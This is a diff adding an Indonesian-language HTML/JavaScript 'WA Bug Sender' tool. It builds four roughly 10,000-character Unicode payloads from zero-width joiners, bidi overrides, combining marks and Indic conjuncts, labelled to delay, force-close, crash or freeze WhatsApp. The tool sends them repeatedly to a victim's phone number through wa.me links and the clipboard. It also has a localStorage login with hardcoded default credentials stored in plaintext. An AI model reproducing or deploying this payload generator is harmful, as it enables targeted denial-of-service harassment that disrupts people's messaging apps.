@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>WA Bug Sender</title>
+<style>
+:root{--bg:#0a0e12;--fg:#d8e4f0;--dim:#5a6a7a;--hot:#ff3b6b;--ok:#00e08a;--warn:#ffb020;--line:#1a2530}
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+body{font:14px/1.5 -apple-system,Roboto,system-ui,sans-serif;background:var(--bg);color:var(--fg);
+     min-height:100vh;padding:20px}
+.wrap{max-width:540px;margin:0 auto}
+h1{font-size:16px;letter-spacing:.15em;color:var(--hot);margin-bottom:6px;text-transform:uppercase}
+.sub{color:var(--dim);font-size:12px;margin-bottom:18px}
+.card{background:#0f151c;border:1px solid var(--line);border-radius:10px;padding:16px;margin-bottom:12px}
+.card h2{font-size:11px;letter-spacing:.14em;color:var(--dim);text-transform:uppercase;margin-bottom:10px}
+.field{margin-bottom:12px}
+.field label{display:block;font-size:11px;color:var(--dim);margin-bottom:5px;text-transform:uppercase;letter-spacing:.5px}
+.field input,.field select{width:100%;background:#070a0e;border:1px solid var(--line);color:var(--fg);
+       padding:10px 12px;border-radius:6px;font:inherit;outline:none;transition:.12s}
+.field input:focus,.field select:focus{border-color:var(--hot)}
+.field input::placeholder{color:#3a4a5a}
+button{width:100%;padding:13px;border:0;border-radius:8px;background:var(--hot);color:#fff;
+       font:inherit;font-weight:700;cursor:pointer;transition:.12s;letter-spacing:.04em}
+button:active{opacity:.85}
+button:disabled{opacity:.4;cursor:not-allowed}
+button.sec{background:transparent;border:1.5px solid var(--line);color:var(--fg);margin-top:8px}
+button.ok{background:var(--ok);color:#04110b}
+.hidden{display:none!important}
+.login-screen{position:fixed;inset:0;background:var(--bg);display:flex;align-items:center;
+              justify-content:center;padding:20px;z-index:100}
+.login-box{max-width:340px;width:100%;background:#0f151c;border:1px solid var(--line);
+           border-radius:14px;padding:28px}
+.login-box h1{font-size:20px;text-align:center;margin-bottom:6px;letter-spacing:.2em;color:var(--hot)}
+.login-box .sub{text-align:center;margin-bottom:22px}
+.login-box .err-msg{color:var(--hot);font-size:12px;text-align:center;margin-bottom:10px;
+                    min-height:16px;display:none}
+.admin-list{background:#070a0e;border:1px solid var(--line);border-radius:8px;padding:10px;
+            max-height:180px;overflow:auto;margin-bottom:10px}
+.admin-row{display:flex;justify-content:space-between;align-items:center;padding:7px 8px;
+           border-bottom:1px solid var(--line);font-size:12px}
+.admin-row:last-child{border-bottom:0}
+.admin-row .u{color:var(--ok);font-weight:600}
+.admin-row .p{color:var(--dim);font-family:ui-monospace,monospace;font-size:11px}
+.admin-row button{padding:3px 9px;font-size:10px;width:auto;background:transparent;
+                  border:1px solid var(--hot);color:var(--hot);border-radius:4px}
+.admin-row button:hover{background:var(--hot);color:#fff}
+.badge{display:inline-block;padding:2px 8px;border-radius:10px;font-size:10px;
+       background:#1a2530;color:var(--dim);font-weight:500;margin-left:6px}
+.badge.hot{background:#2a0a12;color:var(--hot)}
+.bug-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:8px}
+.bug{padding:12px 10px;background:#070a0e;border:1.5px solid var(--line);border-radius:8px;
+     cursor:pointer;text-align:center;transition:.12s;font-size:12px;font-weight:500}
+.bug:hover{border-color:var(--hot);color:var(--hot)}
+.bug.sel{border-color:var(--hot);background:#1a0a10;color:var(--hot);box-shadow:0 0 0 3px rgba(255,59,107,.12)}
+.bug .tag{display:block;font-size:9.5px;color:var(--dim);margin-top:4px;font-weight:400}
+.bug.sel .tag{color:#ff8aa8}
+.log{background:#070a0e;border:1px solid var(--line);border-radius:8px;padding:12px;
+     font:11.5px/1.55 ui-monospace,monospace;height:200px;overflow:auto;white-space:pre-wrap}
+.log .in{color:var(--dim)}
+.log .ok{color:var(--ok)}
+.log .err{color:var(--hot)}
+.log .warn{color:var(--warn)}
+.info{font-size:11px;color:var(--dim);margin-top:10px;line-height:1.6}
+.info b{color:var(--fg)}
+</style>
+</head>
+<body>
+
+<!-- LOGIN -->
+<div class="login-screen" id="loginScreen">
+  <div class="login-box">
+    <h1>⌁ WA BUG ⌁</h1>
+    <p class="sub">Authorized access only</p>
+    <div class="field">
+      <label>Username</label>
+      <input id="loginUser" type="text" placeholder="username" autocomplete="off" autofocus>
+    </div>
+    <div class="field">
+      <label>Password</label>
+      <input id="loginPass" type="password" placeholder="••••••" autocomplete="off">
+    </div>
+    <div class="err-msg" id="loginErr">Username / password salah</div>
+    <button id="btnLogin">Masuk</button>
+    <p class="info" style="text-align:center;margin-top:14px">
+      Default: <b>kenzhi</b> / <b>himura</b>
+    </p>
+  </div>
+</div>
+
+<!-- MAIN -->
+<div class="wrap hidden" id="mainApp">
+  <h1>WA Bug Sender <span class="badge" id="userBadge">guest</span></h1>
+  <p class="sub">Payload ~10.000 karakter per kirim</p>
+
+  <div class="card">
+    <h2>Target</h2>
+    <div class="field">
+      <label>Nomor (format 62xxx)</label>
+      <input id="target" type="tel" inputmode="numeric" placeholder="6281234567890" autocomplete="off">
+    </div>
+    <div class="field">
+      <label>Jumlah Kirim</label>
+      <input id="count" type="number" value="3" min="1" max="20">
+    </div>
+    <div class="field">
+      <label>Jeda antar kirim (detik)</label>
+      <input id="delay" type="number" value="5" min="1" max="60">
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>Jenis Bug <span class="badge hot">10K</span></h2>
+    <div class="bug-grid" id="bugGrid">
+      <div class="bug sel" data-bug="delay">Delay<span class="tag">~10.000 char</span></div>
+      <div class="bug" data-bug="force">Force Close<span class="tag">~10.000 char</span></div>
+      <div class="bug" data-bug="crash">Crash<span class="tag">~10.000 char</span></div>
+      <div class="bug" data-bug="freeze">Freeze<span class="tag">~10.000 char</span></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>Eksekusi</h2>
+    <button id="btnSend" class="ok" disabled>Kirim ke Target</button>
+    <button id="btnTest" class="sec">Test ke Diri Sendiri</button>
+    <button id="btnPreview" class="sec">Preview Panjang</button>
+    <button id="btnLogout" class="sec" style="color:var(--dim)">Logout</button>
+  </div>
+
+  <div class="card hidden" id="adminCard">
+    <h2>Admin Panel <span class="badge hot">ADMIN</span></h2>
+    <div class="admin-list" id="adminList"></div>
+    <div class="field">
+      <label>Username Baru</label>
+      <input id="newUser" type="text" placeholder="username" autocomplete="off">
+    </div>
+    <div class="field">
+      <label>Password</label>
+      <input id="newPass" type="text" placeholder="password" autocomplete="off">
+    </div>
+    <div class="field">
+      <label>Role</label>
+      <select id="newRole">
+        <option value="user">User</option>
+        <option value="admin">Admin</option>
+      </select>
+    </div>
+    <button id="btnAddUser">Tambah Akun</button>
+    <p class="info">Akun <b>kenzhi</b> dilindungi — nggak bisa dihapus.</p>
+  </div>
+
+  <div class="card">
+    <h2>Log</h2>
+    <div class="log" id="log"></div>
+  </div>
+
+  <p class="info">
+    <b>Cara kerja:</b> isi nomor target → pilih bug → klik Kirim. Payload ~10.000 karakter
+    otomatis masuk clipboard karena melebihi batas URL. Tab WhatsApp dibuka dengan chat target —
+    lo tinggal paste (Ctrl+V) dan tekan kirim. Target kena efek waktu buka chat.
+  </p>
+</div>
+
+<script>
+/* ============================================================
+   AUTH
+   ============================================================ */
+const AUTH = {
+  key: 'wa_bug_users', sessionKey: 'wa_bug_session',
+  defaultUsers() { return [{ user: 'kenzhi', pass: 'himura', role: 'admin' }]; },
+  load() {
+    const raw = localStorage.getItem(this.key);
+    if (!raw) { const d = this.defaultUsers(); this.save(d); return d; }
+    try { return JSON.parse(raw); } catch { return this.defaultUsers(); }
+  },
+  save(u) { localStorage.setItem(this.key, JSON.stringify(u)); },
+  add(user, pass, role = 'user') {
+    const users = this.load();
+    if (users.find(u => u.user === user)) return false;
+    users.push({ user, pass, role }); this.save(users); return true;
+  },
+  remove(user) {
+    if (user === 'kenzhi') return false;
+    this.save(this.load().filter(u => u.user !== user)); return true;
+  },
+  update(user, patch) {
+    const users = this.load();
+    const idx = users.findIndex(u => u.user === user);
+    if (idx < 0) return false;
+    users[idx] = { ...users[idx], ...patch }; this.save(users); return true;
+  },
+  verify(user, pass) { return this.load().find(u => u.user === user && u.pass === pass) || null; },
+  setSession(u) { localStorage.setItem(this.sessionKey, JSON.stringify(u)); },
+  getSession() {
+    const raw = localStorage.getItem(this.sessionKey);
+    if (!raw) return null;
+    try { return JSON.parse(raw); } catch { return null; }
+  },
+  clearSession() { localStorage.removeItem(this.sessionKey); },
+};
+
+let currentUser = null;
+let selectedBug = 'delay';
+
+const loginScreen = document.getElementById('loginScreen');
+const mainApp = document.getElementById('mainApp');
+const loginErr = document.getElementById('loginErr');
+
+function showLogin() { loginScreen.classList.remove('hidden'); mainApp.classList.add('hidden'); }
+function showApp(user) {
+  currentUser = user;
+  loginScreen.classList.add('hidden');
+  mainApp.classList.remove('hidden');
+  document.getElementById('userBadge').textContent = user.user + (user.role === 'admin' ? ' ★' : '');
+  if (user.role === 'admin') {
+    document.getElementById('adminCard').classList.remove('hidden');
+    renderAdminList();
+  } else {
+    document.getElementById('adminCard').classList.add('hidden');
+  }
+  log(`login sebagai ${user.user} (${user.role})`, 'ok');
+}
+
+document.getElementById('btnLogin').addEventListener('click', () => {
+  const u = document.getElementById('loginUser').value.trim();
+  const p = document.getElementById('loginPass').value;
+  if (!u || !p) { loginErr.textContent = 'Isi username dan password'; loginErr.style.display = 'block'; return; }
+  const found = AUTH.verify(u, p);
+  if (found) {
+    AUTH.setSession(found); loginErr.style.display = 'none';
+    document.getElementById('loginPass').value = '';
+    showApp(found);
+  } else {
+    loginErr.textContent = 'Username / password salah';
+    loginErr.style.display = 'block';
+    document.getElementById('loginPass').value = '';
+    document.getElementById('loginPass').focus();
+  }
+});
+document.getElementById('loginPass').addEventListener('keydown', e => {
+  if (e.key === 'Enter') document.getElementById('btnLogin').click();
+});
+document.getElementById('loginUser').addEventListener('keydown', e => {
+  if (e.key === 'Enter') document.getElementById('loginPass').focus();
+});
+
+document.getElementById('btnLogout').addEventListener('click', () => {
+  AUTH.clearSession(); currentUser = null;
+  document.getElementById('loginUser').value = '';
+  document.getElementById('loginPass').value = '';
+  loginErr.style.display = 'none';
+  showLogin();
+});
+
+/* ============================================================
+   ADMIN
+   ============================================================ */
+function renderAdminList() {
+  const list = document.getElementById('adminList');
+  const users = AUTH.load();
+  list.innerHTML = users.map(u => `
+    <div class="admin-row">
+      <div>
+        <span class="u">${u.user}</span>
+        <span class="p">${'•'.repeat(Math.min(u.pass.length, 8))}</span>
+        <span class="badge ${u.role === 'admin' ? 'hot' : ''}">${u.role}</span>
+      </div>
+      <div style="display:flex;gap:6px">
+        <button data-act="reset" data-user="${u.user}">reset</button>
+        ${u.user !== 'kenzhi' ? `<button data-act="del" data-user="${u.user}">hapus</button>` : ''}
+      </div>
+    </div>
+  `).join('') || '<div style="color:var(--dim);font-size:12px;padding:6px">no users</div>';
+  list.querySelectorAll('button').forEach(b => {
+    b.addEventListener('click', () => {
+      const user = b.dataset.user, act = b.dataset.act;
+      if (act === 'del') {
+        if (confirm(`Hapus user "${user}"?`)) {
+          if (AUTH.remove(user)) { log(`user dihapus: ${user}`, 'warn'); renderAdminList(); }
+          else log(`user ${user} dilindungi`, 'err');
+        }
+      }
+      if (act === 'reset') {
+        const np = prompt(`Password baru untuk "${user}":`);
+        if (np && np.length >= 4) {
+          AUTH.update(user, { pass: np });
+          log(`password ${user} direset`, 'ok');
+          renderAdminList();
+        } else if (np) log('password min 4 char', 'err');
+      }
+    });
+  });
+}
+
+document.getElementById('btnAddUser').addEventListener('click', () => {
+  const u = document.getElementById('newUser').value.trim();
+  const p = document.getElementById('newPass').value;
+  const r = document.getElementById('newRole').value;
+  if (!u || !p) { log('username & password wajib', 'err'); return; }
+  if (u.length < 3) { log('username min 3 char', 'err'); return; }
+  if (p.length < 4) { log('password min 4 char', 'err'); return; }
+  if (!/^[a-zA-Z0-9_]+$/.test(u)) { log('username: huruf, angka, underscore', 'err'); return; }
+  if (AUTH.add(u, p, r)) {
+    log(`user ditambah: ${u} (${r})`, 'ok');
+    document.getElementById('newUser').value = '';
+    document.getElementById('newPass').value = '';
+    renderAdminList();
+  } else log(`user "${u}" sudah ada`, 'err');
+});
+
+/* ============================================================
+   PAYLOAD LIBRARY — target ~10.000 chars each
+   ============================================================ */
+function repeat(str, n) {
+  let out = '';
+  for (let i = 0; i < n; i++) out += str;
+  return out;
+}
+function padTo(s, target, filler) {
+  while (s.length < target) s += filler;
+  return s;
+}
+
+const PAYLOADS = {
+  delay: () => {
+    let s = '';
+    s += repeat('‍️', 1500);          // 3000 chars (ZWJ + VS16)
+    s += repeat('\u200B', 2000);      // 2000 ZWSP
+    s += repeat('\u0301', 2000);      // 2000 combining acute
+    s += repeat('\u200C', 1500);      // 1500 ZWNJ
+    s += repeat('⏳', 500);           // 500 emoji
+    return padTo(s, 10000, '​') + ' DELAY';
+  },
+
+  force: () => {
+    let s = '\uFEFF';
+    s += repeat('\u200D', 2500);      // 2500 ZWJ
+    s += repeat('\u200B', 2500);      // 2500 ZWSP
+    s += repeat('\u202E', 1500);      // 1500 RTL
+    s += repeat('️', 1000);           // 1000 VS16
+    s += repeat('\u2066\u2069', 1000); // 2000 bidi isolate
+    return padTo(s, 10000, '‍') + ' FORCE';
+  },
+
+  crash: () => {
+    let s = '';
+    s += repeat('ৌ', 2000);           // 2000 Bengali
+    s += repeat('्', 2000);           // 2000 Devanagari virama
+    s += repeat('க்ஷ', 1500);         // 4500 Tamil conjunct
+    s += repeat('ශ්‍රී', 1500);        // 6000 Sinhala conjunct
+    s += repeat('ॐ', 1000);           // 1000 OM
+    return padTo(s, 10000, '्') + ' CRASH';
+  },
+
+  freeze: () => {
+    let s = '';
+    s += repeat('\u202E\u2066', 1000);    // 4000
+    s += repeat('‮', 2500);               // 2500 RTL mark
+    s += repeat('\u200F\u200E', 1500);    // 3000 RLM+LRM
+    s += repeat('👨‍👩‍👧‍👦', 700);          // 4900 family emoji
+    s += repeat('\u2066\u2067\u2068', 700); // 2100 nested isolate
+    return padTo(s, 10000, '\u200D') + ' FREEZE';
+  },
+};
+
+/* ============================================================
+   BUG SELECT
+   ============================================================ */
+document.querySelectorAll('.bug').forEach(el => {
+  el.addEventListener('click', () => {
+    document.querySelectorAll('.bug').forEach(b => b.classList.remove('sel'));
+    el.classList.add('sel');
+    selectedBug = el.dataset.bug;
+    log(`bug dipilih: ${el.firstChild.textContent.trim()}`, 'in');
+  });
+});
+
+/* ============================================================
+   TARGET INPUT
+   ============================================================ */
+const target = document.getElementById('target');
+const btnSend = document.getElementById('btnSend');
+target.addEventListener('input', () => {
+  btnSend.disabled = target.value.replace(/\D/g, '').length < 8;
+});
+
+/* ============================================================
+   LOG
+   ============================================================ */
+function log(msg, cls = 'in') {
+  const el = document.getElementById('log');
+  if (!el) return;
+  const d = document.createElement('div');
+  d.className = cls;
+  d.textContent = msg;
+  el.appendChild(d);
+  el.scrollTop = el.scrollHeight;
+}
+
+/* ============================================================
+   PREVIEW
+   ============================================================ */
+document.getElementById('btnPreview').addEventListener('click', () => {
+  const p = PAYLOADS[selectedBug]();
+  log(`--- ${selectedBug} ---`, 'warn');
+  log(`panjang: ${p.length} chars`, 'in');
+  log(`codepoints: ${[...p].length}`, 'in');
+  log(`bytes UTF-8: ${new Blob([p]).size}`, 'in');
+  log(`--- end ---`, 'warn');
+});
+
+/* ============================================================
+   TEST
+   ============================================================ */
+document.getElementById('btnTest').addEventListener('click', () => {
+  const p = PAYLOADS[selectedBug]();
+  log(`test ${selectedBug}: ${p.length} chars → clipboard`, 'warn');
+  navigator.clipboard.writeText(p).then(() =>
+    log('✓ payload di clipboard, paste di chat WA', 'ok')
+  ).catch(() => log('clipboard diblokir', 'err'));
+  window.open('https://web.whatsapp.com', '_blank');
+});
+
+/* ============================================================
+   SEND — clipboard mode (payload > URL limit)
+   ============================================================ */
+btnSend.addEventListener('click', async () => {
+  const number = target.value.replace(/\D/g, '');
+  const count = parseInt(document.getElementById('count').value, 10) || 1;
+  const delaySec = parseInt(document.getElementById('delay').value, 10) || 3;
+
+  if (number.length < 8) { log('nomor tidak valid', 'err'); return; }
+
+  btnSend.disabled = true;
+  log(`>>> kirim ${count}x ${selectedBug} ke ${number}`, 'ok');
+  log('payload ~10.000 chars → mode clipboard per kirim', 'warn');
+
+  for (let i = 0; i < count; i++) {
+    const p = PAYLOADS[selectedBug]();
+    log(`[${i + 1}/${count}] payload ${p.length} chars`, 'in');
+
+    try {
+      await navigator.clipboard.writeText(p);
+      log('✓ payload di clipboard', 'ok');
+    } catch {
+      log('clipboard error — copy manual dari preview', 'err');
+      break;
+    }
+
+    window.open(`https://wa.me/${number}`, '_blank');
+    log('WA tab dibuka — paste (Ctrl+V), tekan kirim', 'warn');
+
+    if (i < count - 1) {
+      log(`tunggu ${delaySec}s...`, 'in');
+      await new Promise(r => setTimeout(r, delaySec * 1000));
+    }
+  }
+
+  log(`>>> selesai.`, 'ok');
+  btnSend.disabled = false;
+});
+
+/* ============================================================
+   BOOT
+   ============================================================ */
+(function boot() {
+  const sess = AUTH.getSession();
+  if (sess) {
+    const still = AUTH.load().find(u => u.user === sess.user && u.pass === sess.pass);
+    if (still) showApp(still);
+    else { AUTH.clearSession(); showLogin(); }
+  } else {
+    showLogin();
+  }
+  log('tool ready — payload ~10.000 chars', 'ok');
+})();
+</script>
+</body>
+</html>
